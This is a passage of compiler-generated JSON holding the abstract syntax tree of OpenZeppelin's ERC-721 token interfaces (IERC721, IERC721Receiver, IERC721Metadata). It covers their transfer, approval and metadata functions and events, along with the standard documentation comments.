`to`."},"id":1013,"name":"Transfer","nameLocation":"384:8:2","nodeType":"EventDefinition","parameters":{"id":1012,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1007,"indexed":true,"mutability":"mutable","name":"from","nameLocation":"409:4:2","nodeType":"VariableDeclaration","scope":1013,"src":"393:20:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1006,"name":"address","nodeType":"ElementaryTypeName","src":"393:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1009,"indexed":true,"mutability":"mutable","name":"to","nameLocation":"431:2:2","nodeType":"VariableDeclaration","scope":1013,"src":"415:18:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1008,"name":"address","nodeType":"ElementaryTypeName","src":"415:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1011,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"451:7:2","nodeType":"VariableDeclaration","scope":1013,"src":"435:23:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1010,"name":"uint256","nodeType":"ElementaryTypeName","src":"435:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"392:67:2"},"src":"378:82:2"},{"anonymous":false,"documentation":{"id":1014,"nodeType":"StructuredDocumentation","src":"466:94:2","text":" @dev Emitted when `owner` enables `approved` to manage the `tokenId` token."},"id":1022,"name":"Approval","nameLocation":"571:8:2","nodeType":"EventDefinition","parameters":{"id":1021,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1016,"indexed":true,"mutability":"mutable","name":"owner","nameLocation":"596:5:2","nodeType":"VariableDeclaration","scope":1022,"src":"580:21:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1015,"name":"address","nodeType":"ElementaryTypeName","src":"580:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1018,"indexed":true,"mutability":"mutable","name":"approved","nameLocation":"619:8:2","nodeType":"VariableDeclaration","scope":1022,"src":"603:24:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1017,"name":"address","nodeType":"ElementaryTypeName","src":"603:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1020,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"645:7:2","nodeType":"VariableDeclaration","scope":1022,"src":"629:23:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1019,"name":"uint256","nodeType":"ElementaryTypeName","src":"629:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"579:74:2"},"src":"565:89:2"},{"anonymous":false,"documentation":{"id":1023,"nodeType":"StructuredDocumentation","src":"660:117:2","text":" @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets."},"id":1031,"name":"ApprovalForAll","nameLocation":"788:14:2","nodeType":"EventDefinition","parameters":{"id":1030,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1025,"indexed":true,"mutability":"mutable","name":"owner","nameLocation":"819:5:2","nodeType":"VariableDeclaration","scope":1031,"src":"803:21:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1024,"name":"address","nodeType":"ElementaryTypeName","src":"803:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1027,"indexed":true,"mutability":"mutable","name":"operator","nameLocation":"842:8:2","nodeType":"VariableDeclaration","scope":1031,"src":"826:24:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1026,"name":"address","nodeType":"ElementaryTypeName","src":"826:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1029,"indexed":false,"mutability":"mutable","name":"approved","nameLocation":"857:8:2","nodeType":"VariableDeclaration","scope":1031,"src":"852:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1028,"name":"bool","nodeType":"ElementaryTypeName","src":"852:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"802:64:2"},"src":"782:85:2"},{"documentation":{"id":1032,"nodeType":"StructuredDocumentation","src":"873:76:2","text":" @dev Returns the number of tokens in ``owner``'s account."},"functionSelector":"70a08231","id":1039,"implemented":false,"kind":"function","modifiers":[],"name":"balanceOf","nameLocation":"963:9:2","nodeType":"FunctionDefinition","parameters":{"id":1035,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1034,"mutability":"mutable","name":"owner","nameLocation":"981:5:2","nodeType":"VariableDeclaration","scope":1039,"src":"973:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1033,"name":"address","nodeType":"ElementaryTypeName","src":"973:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"972:15:2"},"returnParameters":{"id":1038,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1037,"mutability":"mutable","name":"balance","nameLocation":"1019:7:2","nodeType":"VariableDeclaration","scope":1039,"src":"1011:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1036,"name":"uint256","nodeType":"ElementaryTypeName","src":"1011:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1010:17:2"},"scope":1114,"src":"954:74:2","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":1040,"nodeType":"StructuredDocumentation","src":"1034:131:2","text":" @dev Returns the owner of the `tokenId` token.\n Requirements:\n - `tokenId` must exist."},"functionSelector":"6352211e","id":1047,"implemented":false,"kind":"function","modifiers":[],"name":"ownerOf","nameLocation":"1179:7:2","nodeType":"FunctionDefinition","parameters":{"id":1043,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1042,"mutability":"mutable","name":"tokenId","nameLocation":"1195:7:2","nodeType":"VariableDeclaration","scope":1047,"src":"1187:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1041,"name":"uint256","nodeType":"ElementaryTypeName","src":"1187:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1186:17:2"},"returnParameters":{"id":1046,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1045,"mutability":"mutable","name":"owner","nameLocation":"1235:5:2","nodeType":"VariableDeclaration","scope":1047,"src":"1227:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1044,"name":"address","nodeType":"ElementaryTypeName","src":"1227:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1226:15:2"},"scope":1114,"src":"1170:72:2","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":1048,"nodeType":"StructuredDocumentation","src":"1248:556:2","text":" @dev Safely transfers `tokenId` token from `from` to `to`.\n Requirements:\n - `from` cannot be the zero address.\n - `to` cannot be the zero address.\n - `tokenId` token must exist and be owned by `from`.\n - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n Emits a {Transfer} event."},"functionSelector":"b88d4fde","id":1059,"implemented":false,"kind":"function","modifiers":[],"name":"safeTransferFrom","nameLocation":"1818:16:2","nodeType":"FunctionDefinition","parameters":{"id":1057,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1050,"mutability":"mutable","name":"from","nameLocation":"1852:4:2","nodeType":"VariableDeclaration","scope":1059,"src":"1844:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1049,"name":"address","nodeType":"ElementaryTypeName","src":"1844:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1052,"mutability":"mutable","name":"to","nameLocation":"1874:2:2","nodeType":"VariableDeclaration","scope":1059,"src":"1866:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1051,"name":"address","nodeType":"ElementaryTypeName","src":"1866:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1054,"mutability":"mutable","name":"tokenId","nameLocation":"1894:7:2","nodeType":"VariableDeclaration","scope":1059,"src":"1886:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1053,"name":"uint256","nodeType":"ElementaryTypeName","src":"1886:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1056,"mutability":"mutable","name":"data","nameLocation":"1926:4:2","nodeType":"VariableDeclaration","scope":1059,"src":"1911:19:2","stateVariable":false,"storageLocation":"calldata","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes"},"typeName":{"id":1055,"name":"bytes","nodeType":"ElementaryTypeName","src":"1911:5:2","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"1834:102:2"},"returnParameters":{"id":1058,"nodeType":"ParameterList","parameters":[],"src":"1945:0:2"},"scope":1114,"src":"1809:137:2","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":1060,"nodeType":"StructuredDocumentation","src":"1952:687:2","text":" @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n are aware of the ERC721 protocol to prevent tokens from being forever locked.\n Requirements:\n - `from` cannot be the zero address.\n - `to` cannot be the zero address.\n - `tokenId` token must exist and be owned by `from`.\n - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\n - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n Emits a {Transfer} event."},"functionSelector":"42842e0e","id":1069,"implemented":false,"kind":"function","modifiers":[],"name":"safeTransferFrom","nameLocation":"2653:16:2","nodeType":"FunctionDefinition","parameters":{"id":1067,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1062,"mutability":"mutable","name":"from","nameLocation":"2687:4:2","nodeType":"VariableDeclaration","scope":1069,"src":"2679:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1061,"name":"address","nodeType":"ElementaryTypeName","src":"2679:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1064,"mutability":"mutable","name":"to","nameLocation":"2709:2:2","nodeType":"VariableDeclaration","scope":1069,"src":"2701:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1063,"name":"address","nodeType":"ElementaryTypeName","src":"2701:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1066,"mutability":"mutable","name":"tokenId","nameLocation":"2729:7:2","nodeType":"VariableDeclaration","scope":1069,"src":"2721:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1065,"name":"uint256","nodeType":"ElementaryTypeName","src":"2721:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2669:73:2"},"returnParameters":{"id":1068,"nodeType":"ParameterList","parameters":[],"src":"2751:0:2"},"scope":1114,"src":"2644:108:2","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":1070,"nodeType":"StructuredDocumentation","src":"2758:732:2","text":" @dev Transfers `tokenId` token from `from` to `to`.\n WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\n or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\n understand this adds an external call which potentially creates a reentrancy vulnerability.\n Requirements:\n - `from` cannot be the zero address.\n - `to` cannot be the zero address.\n - `tokenId` token must be owned by `from`.\n - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n Emits a {Transfer} event."},"functionSelector":"23b872dd","id":1079,"implemented":false,"kind":"function","modifiers":[],"name":"transferFrom","nameLocation":"3504:12:2","nodeType":"FunctionDefinition","parameters":{"id":1077,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1072,"mutability":"mutable","name":"from","nameLocation":"3534:4:2","nodeType":"VariableDeclaration","scope":1079,"src":"3526:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1071,"name":"address","nodeType":"ElementaryTypeName","src":"3526:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1074,"mutability":"mutable","name":"to","nameLocation":"3556:2:2","nodeType":"VariableDeclaration","scope":1079,"src":"3548:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1073,"name":"address","nodeType":"ElementaryTypeName","src":"3548:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1076,"mutability":"mutable","name":"tokenId","nameLocation":"3576:7:2","nodeType":"VariableDeclaration","scope":1079,"src":"3568:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1075,"name":"uint256","nodeType":"ElementaryTypeName","src":"3568:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3516:73:2"},"returnParameters":{"id":1078,"nodeType":"ParameterList","parameters":[],"src":"3598:0:2"},"scope":1114,"src":"3495:104:2","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":1080,"nodeType":"StructuredDocumentation","src":"3605:452:2","text":" @dev Gives permission to `to` to transfer `tokenId` token to another account.\n The approval is cleared when the token is transferred.\n Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n Requirements:\n - The caller must own the token or be an approved operator.\n - `tokenId` must exist.\n Emits an {Approval} event."},"functionSelector":"095ea7b3","id":1087,"implemented":false,"kind":"function","modifiers":[],"name":"approve","nameLocation":"4071:7:2","nodeType":"FunctionDefinition","parameters":{"id":1085,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1082,"mutability":"mutable","name":"to","nameLocation":"4087:2:2","nodeType":"VariableDeclaration","scope":1087,"src":"4079:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1081,"name":"address","nodeType":"ElementaryTypeName","src":"4079:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1084,"mutability":"mutable","name":"tokenId","nameLocation":"4099:7:2","nodeType":"VariableDeclaration","scope":1087,"src":"4091:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1083,"name":"uint256","nodeType":"ElementaryTypeName","src":"4091:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4078:29:2"},"returnParameters":{"id":1086,"nodeType":"ParameterList","parameters":[],"src":"4116:0:2"},"scope":1114,"src":"4062:55:2","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":1088,"nodeType":"StructuredDocumentation","src":"4123:309:2","text":" @dev Approve or remove `operator` as an operator for the caller.\n Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n Requirements:\n - The `operator` cannot be the caller.\n Emits an {ApprovalForAll} event."},"functionSelector":"a22cb465","id":1095,"implemented":false,"kind":"function","modifiers":[],"name":"setApprovalForAll","nameLocation":"4446:17:2","nodeType":"FunctionDefinition","parameters":{"id":1093,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1090,"mutability":"mutable","name":"operator","nameLocation":"4472:8:2","nodeType":"VariableDeclaration","scope":1095,"src":"4464:16:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1089,"name":"address","nodeType":"ElementaryTypeName","src":"4464:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1092,"mutability":"mutable","name":"_approved","nameLocation":"4487:9:2","nodeType":"VariableDeclaration","scope":1095,"src":"4482:14:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1091,"name":"bool","nodeType":"ElementaryTypeName","src":"4482:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"4463:34:2"},"returnParameters":{"id":1094,"nodeType":"ParameterList","parameters":[],"src":"4506:0:2"},"scope":1114,"src":"4437:70:2","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":1096,"nodeType":"StructuredDocumentation","src":"4513:139:2","text":" @dev Returns the account approved for `tokenId` token.\n Requirements:\n - `tokenId` must exist."},"functionSelector":"081812fc","id":1103,"implemented":false,"kind":"function","modifiers":[],"name":"getApproved","nameLocation":"4666:11:2","nodeType":"FunctionDefinition","parameters":{"id":1099,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1098,"mutability":"mutable","name":"tokenId","nameLocation":"4686:7:2","nodeType":"VariableDeclaration","scope":1103,"src":"4678:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1097,"name":"uint256","nodeType":"ElementaryTypeName","src":"4678:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4677:17:2"},"returnParameters":{"id":1102,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1101,"mutability":"mutable","name":"operator","nameLocation":"4726:8:2","nodeType":"VariableDeclaration","scope":1103,"src":"4718:16:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1100,"name":"address","nodeType":"ElementaryTypeName","src":"4718:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4717:18:2"},"scope":1114,"src":"4657:79:2","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":1104,"nodeType":"StructuredDocumentation","src":"4742:138:2","text":" @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n See {setApprovalForAll}"},"functionSelector":"e985e9c5","id":1113,"implemented":false,"kind":"function","modifiers":[],"name":"isApprovedForAll","nameLocation":"4894:16:2","nodeType":"FunctionDefinition","parameters":{"id":1109,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1106,"mutability":"mutable","name":"owner","nameLocation":"4919:5:2","nodeType":"VariableDeclaration","scope":1113,"src":"4911:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1105,"name":"address","nodeType":"ElementaryTypeName","src":"4911:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1108,"mutability":"mutable","name":"operator","nameLocation":"4934:8:2","nodeType":"VariableDeclaration","scope":1113,"src":"4926:16:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1107,"name":"address","nodeType":"ElementaryTypeName","src":"4926:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4910:33:2"},"returnParameters":{"id":1112,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1111,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1113,"src":"4967:4:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1110,"name":"bool","nodeType":"ElementaryTypeName","src":"4967:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"4966:6:2"},"scope":1114,"src":"4885:88:2","stateMutability":"view","virtual":false,"visibility":"external"}],"scope":1115,"src":"250:4725:2","usedErrors":[]}],"src":"108:4868:2"},"id":2},"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol","exportedSymbols":{"IERC721Receiver":[1132]},"id":1133,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1116,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"116:23:3"},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"interface","documentation":{"id":1117,"nodeType":"StructuredDocumentation","src":"141:152:3","text":" @title ERC721 token receiver interface\n @dev Interface for any contract that wants to support safeTransfers\n from ERC721 asset contracts."},"fullyImplemented":false,"id":1132,"linearizedBaseContracts":[1132],"name":"IERC721Receiver","nameLocation":"304:15:3","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":1118,"nodeType":"StructuredDocumentation","src":"326:493:3","text":" @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\n by `operator` from `from`, this function is called.\n It must return its Solidity selector to confirm the token transfer.\n If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\n The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`."},"functionSelector":"150b7a02","id":1131,"implemented":false,"kind":"function","modifiers":[],"name":"onERC721Received","nameLocation":"833:16:3","nodeType":"FunctionDefinition","parameters":{"id":1127,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1120,"mutability":"mutable","name":"operator","nameLocation":"867:8:3","nodeType":"VariableDeclaration","scope":1131,"src":"859:16:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1119,"name":"address","nodeType":"ElementaryTypeName","src":"859:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1122,"mutability":"mutable","name":"from","nameLocation":"893:4:3","nodeType":"VariableDeclaration","scope":1131,"src":"885:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1121,"name":"address","nodeType":"ElementaryTypeName","src":"885:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1124,"mutability":"mutable","name":"tokenId","nameLocation":"915:7:3","nodeType":"VariableDeclaration","scope":1131,"src":"907:15:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1123,"name":"uint256","nodeType":"ElementaryTypeName","src":"907:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1126,"mutability":"mutable","name":"data","nameLocation":"947:4:3","nodeType":"VariableDeclaration","scope":1131,"src":"932:19:3","stateVariable":false,"storageLocation":"calldata","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes"},"typeName":{"id":1125,"name":"bytes","nodeType":"ElementaryTypeName","src":"932:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"849:108:3"},"returnParameters":{"id":1130,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1129,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1131,"src":"976:6:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"typeName":{"id":1128,"name":"bytes4","nodeType":"ElementaryTypeName","src":"976:6:3","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"visibility":"internal"}],"src":"975:8:3"},"scope":1132,"src":"824:160:3","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":1133,"src":"294:692:3","usedErrors":[]}],"src":"116:871:3"},"id":3},"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol","exportedSymbols":{"IERC165":[1722],"IERC721":[1114],"IERC721Metadata":[1159]},"id":1160,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1134,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"112:23:4"},{"absolutePath":"@openzeppelin/contracts/token/ERC721/IERC721.sol","file":"../IERC721.sol","id":1135,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1160,"sourceUnit":1115,"src":"137:24:4","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":1137,"name":"IERC721","nodeType":"IdentifierPath","referencedDeclaration":1114,"src":"326:7:4"},"id":1138,"nodeType":"InheritanceSpecifier","src":"326:7:4"}],"contractDependencies":[],"contractKind":"interface","documentation":{"id":1136,"nodeType":"StructuredDocumentation","src":"163:133:4","text":" @title ERC-721 Non-Fungible Token Standard, optional metadata extension\n @dev See https://eips.ethereum.org/EIPS/eip-721"},"fullyImplemented":false,"id":1159,"linearizedBaseContracts":[1159,1114,1722],"name":"IERC721Metadata","nameLocation":"307:15:4","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":1139,"nodeType":"StructuredDocumentation","src":"340:58:4","text":" @dev Returns the token collection name."},"functionSelector":"06fdde03","id":1144,"implemented":false,"kind":"function","modifiers":[],"name":"name","nameLocation":"412:4:4","nodeType":"FunctionDefinition","parameters":{"id":1140,"nodeType":"ParameterList","parameters":[],"src":"416:2:4"},"returnParameters":{"id":1143,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1142,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1144,"src":"442:13:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1141,"name":"string","nodeType":"ElementaryTypeName","src":"442:6:4","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"441:15:4"},"scope":1159,"src":"403:54:4","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":1145,"nodeType":"StructuredDocumentation","src":"463:60:4","text":" @dev Returns the token collection symbol."},"functionSelector":"95d89b41","id":1150,"implemented":false,"kind":"function","modifiers":[],"name":"symbol","nameLocation":"537:6:4","nodeType":"FunctionDefinition","parameters":{"id":1146,"nodeType":"ParameterList","parameters":[],"src":"543:2:4"},"returnParameters":{"id":1149,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1148,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1150,"src":"569:13:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1147,"name":"string","nodeType":"ElementaryTypeName","src":"569:6:4","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"568:15:4"},"scope":1159,"src":"528:56:4","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":1151,"nodeType":"StructuredDocumentation","src":"590:90:4","text":" @dev Returns the Uniform Resource Identifier (URI) for `tokenId` 